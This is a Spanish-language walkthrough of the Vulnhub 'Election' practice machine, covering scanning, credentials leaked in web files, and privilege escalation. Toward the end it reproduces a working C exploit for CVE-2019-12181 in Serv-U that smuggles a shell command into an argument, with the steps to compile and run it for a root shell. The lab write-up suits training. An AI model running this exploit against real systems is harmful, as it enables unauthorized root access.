---
title: Election
layout: default
nav_order: 1
parent: Vulnhub
---

# Election
{:.no_toc}

---

1. List
{:toc}

---


[Descarga de la máquina](https://www.vulnhub.com/entry/election-1,503/)

Primero configuraremos la máquina para que su conexión sea con adaptador puente dentro de la configuración de VirtualBox. Una vez hecho comprobaremos que tenemos conexión con esta, teniendo en cuenta que nuestra máquina atacante esté también en modo adaptador puente.

## Reconocimiento

Para saber la IP de la máquina podemos realizar un escaneo de la red completa. En este caso utilizaremos arp-scan, que realiza un escaneo mediante el protocolo ARP.

```shell
arp-scan -I ens33 --localnet --ignoredups
```

En mi caso la IP de la máquina víctima es 192.168.1.37 y la atacante 192.168.1.38. Por lo que ahora podemos realizar un escaneo más intensivo de sus puertos, en este caso de los que tiene abiertos.

```shell
nmap -p- -sS --open --min-rate 5000 192.168.1.37 -n -Pn -oG allPorts
```

Vemos que tiene los puertos 22 y 80 abiertos, ahora veremos sus versiones.

```shell
nmap -sCV -p22,80 192.168.1.37 -oN targeted
```

![](/assets/images/Imagenes/Pasted image 20240918113827.png)

Vemos que la página principal es del servicio apache, por lo que deberemos investigar para ver si tiene más directorios que no podamos acceder. 

![](/assets/images/Imagenes/Pasted image 20240918111531.png)

En este caso podemos utilizar gobuster, herramienta que nos permite escanear directorios.

```shell
gobuster dir -u 192.168.1.37 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt
```

Tras esto vemos que hay varios directorios y archivos disponibles, entre ellos /election, phpmyadmin, robots.txt y phpinfo.php.

![](/assets/images/Imagenes/Pasted image 20240918112501.png)

Si entramos a el directorio election nos encontraremos con una página de bienvenida, pero sin nada interesante que podamos probar. En esta nueva página podemos probar a realizar otro escaneo de directorios con gobuster.

Con esto vemos que hay varios directorios como admin, data languages, pero siendo lo más interesante un archivo llamado pass.php con binarios.

![](/assets/images/Imagenes/Pasted image 20240918115050.png)

![](/assets/images/Imagenes/Pasted image 20240918114410.png)

Si traducimos esto dos veces a texto ASCII nos dará las credenciales del usuario 1234 y su contraseña.

![](/assets/images/Imagenes/Pasted image 20240918114741.png)

Al parecer estas no sirven para acceder directamente a la máquina. Pero si probamos en el directorio election/admin con el ID 1234 y la contraseña entraremos en el panel de administrador.

![](/assets/images/Imagenes/Pasted image 20240918115140.png)

## Explotación

Si volvemos a hacer un escaneo de directorios dentro de /election/admin vemos que existe el archivo logs.php, con información sobre el usuario love.

![](/assets/images/Imagenes/Pasted image 20240918115739.png)

```
P@$$w0rd@123
```

Esta vez si intentamos entrar a la máquina con esta contraseña será válida.

![](/assets/images/Imagenes/Pasted image 20240918120057.png)

![](/assets/images/Imagenes/Pasted image 20240918120257.png)
## Escalada de privilegios

Una vez dentro podemos ver si pertenecemos a algún grupo específico dentro del sistema, sin embargo esto no es así. Por otra parte, buscando binarios que podamos ejecutar, y obviando algunos como snap, encontramos uno llamativo llamado Serv-U.

```shell
find / -perm -4000 -ls 2>/dev/null | grep -v snap
```

![](/assets/images/Imagenes/Pasted image 20240918120828.png)

Si buscamos vemos que es un servicio de ftp seguro, por lo que podemos indagar si este tiene alguna vulnerabilidad. Y efectivamente vemos que podemos escalar privilegios debido a una [vulnerabilidad](https://www.exploit-db.com/exploits/47009).

```c
/*

CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation 

vulnerability found by:
Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev

to compile and run:
gcc servu-pe-cve-2019-12181.c -o pe && ./pe

*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```

Con esto comprobamos que la máquina es capaz de compilar el script viendo si existe el directorio gcc con **which gcc**.

```shell
love@election:/$ which gcc
/usr/bin/gcc
```

Una vez comprobado nos dirigiremos al directorio **tmp** y crearemos un archivo llamado exploit.c con el contenido de el exploit visto. Después lo compilaremos con gcc con el mismo nombre de salida.

```shell
love@election:/$ cd /tmp
love@election:/tmp$ nano exploit.c
love@election:/tmp$ gcc exploit.c -o exploit
love@election:/tmp$ ls
exploit
exploit.c
```

Después le daremos permiso de ejecución con **chmod +x** al archivo exploit y lo ejecutaremos con **./exploit**. Con esto tendremos una shell temporal con permisos root.

```shell
love@election:/tmp$ chmod +x exploit
love@election:/tmp$ ./exploit
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
# whoami
root
```

![](/assets/images/Imagenes/Pasted image 20240918121943.png)